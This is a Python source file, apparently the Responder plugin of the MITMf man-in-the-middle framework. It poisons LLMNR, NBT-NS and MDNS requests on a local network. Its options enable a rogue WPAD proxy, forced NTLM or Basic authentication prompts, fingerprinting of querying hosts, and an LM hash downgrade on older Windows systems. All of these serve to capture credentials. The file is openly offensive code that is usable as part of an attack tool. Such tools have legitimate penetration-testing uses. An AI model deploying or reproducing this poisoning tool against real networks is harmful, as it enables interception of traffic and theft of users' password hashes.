#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import os
import threading

from plugins.plugin import Plugin
from libs.responder.Responder import ResponderMITMf
from core.sslstrip.DnsCache import DnsCache
from twisted.internet import reactor

class Responder(Plugin):
    name        = "Responder"
    optname     = "responder"
    desc        = "Poison LLMNR, NBT-NS and MDNS requests"
    tree_output = ["NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online"]
    version     = "0.2"
    has_opts    = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface

        try:
            config = options.configfile['Responder']
        except Exception, e:
            sys.exit('[-] Error parsing config for Responder: ' + str(e))

        if options.Analyze:
            self.tree_output.append("Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned")

        resp = ResponderMITMf()
        resp.setCoreVars(options, config)

        result = resp.AnalyzeICMPRedirect()
        if result:
            for line in result:
                self.tree_output.append(line)

        resp.printDebugInfo()
        resp.start()

    def plugin_reactor(self, strippingFactory):
        reactor.listenTCP(3141, strippingFactory)

    def add_options(self, options):
        options.add_argument('--analyze', dest="Analyze", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
